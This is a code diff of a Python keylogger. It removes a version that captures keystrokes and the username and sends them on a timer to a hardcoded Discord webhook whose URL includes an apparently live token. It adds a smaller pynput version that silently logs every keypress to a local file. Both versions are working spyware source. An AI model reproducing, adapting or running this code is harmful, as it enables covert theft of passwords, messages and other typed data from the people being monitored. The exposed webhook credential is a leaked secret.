@@ -1,68 +1,36 @@
-import keyboard,os
-from threading import Timer
-from datetime import datetime
-from discord_webhook import DiscordWebhook, DiscordEmbed
+from pynput import keyboard
 
-SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
-WEBHOOK = "https://discord.com/api/webhooks/1396447608129454142/TGvfz7txmH8ujO0yhIQoUf91kmasKBSqL4zImtGz9YZKUcw_ic0kVw735ki01_DLracA"
+LOG_FILE = "keylog.txt"
 
-class Keylogger: 
-    def __init__(self, interval, report_method="webhook"):
-        now = datetime.now()
-        self.interval = interval
-        self.report_method = report_method
-        self.log = ""
-        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
-        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
-        self.username = os.getlogin()
+# Function to write keystrokes to file
+def on_press(key):
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(str(key.char))
+    except AttributeError:
+        special_keys = {
+            'space': ' ',
+            'enter': '\n',
+            'tab': '\t',
+        }
+        ignored_keys = {'ctrl', 'ctrl_l', 'ctrl_r', 'shift', 'shift_l', 'shift_r', 'alt', 'alt_l', 'alt_r', 'caps_lock', 'esc', 'cmd', 'cmd_l', 'cmd_r', 'menu'}
+        key_name = key.name if hasattr(key, 'name') else str(key)
+        if key_name == 'backspace':
+            try:
+                with open(LOG_FILE, "rb+") as f:
+                    f.seek(0, 2)
+                    size = f.tell()
+                    if size > 0:
+                        f.truncate(size - 1)
+            except Exception:
+                pass
+        elif key_name in special_keys:
+            with open(LOG_FILE, "a") as f:
+                f.write(special_keys[key_name])
+        elif key_name not in ignored_keys:
+            with open(LOG_FILE, "a") as f:
+                f.write(f'<{key_name}>')
 
-    def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        self.log += name
-
-    def report_to_webhook(self):
-        flag = False
-        webhook = DiscordWebhook(url=WEBHOOK)
-        if len(self.log) > 2000:
-            flag = True
-            path = os.environ["temp"] + "\\report.txt"
-            with open(path, 'w+') as file:
-                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
-                file.write(self.log)
-            with open(path, 'rb') as f:
-                webhook.add_file(file=f.read(), filename='report.txt')
-        else:
-            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
-            webhook.add_embed(embed)    
-        webhook.execute()
-        if flag:
-            os.remove(path)
-
-    def report(self):
-        if self.log:
-            if self.report_method == "webhook":
-                self.report_to_webhook()    
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        timer.daemon = True
-        timer.start()
-
-    def start(self):
-        self.start_dt = datetime.now()
-        keyboard.on_release(callback=self.callback)
-        self.report()
-        keyboard.wait()
-    
-if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
-    keylogger.start()
+# Start listening to keyboard events
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
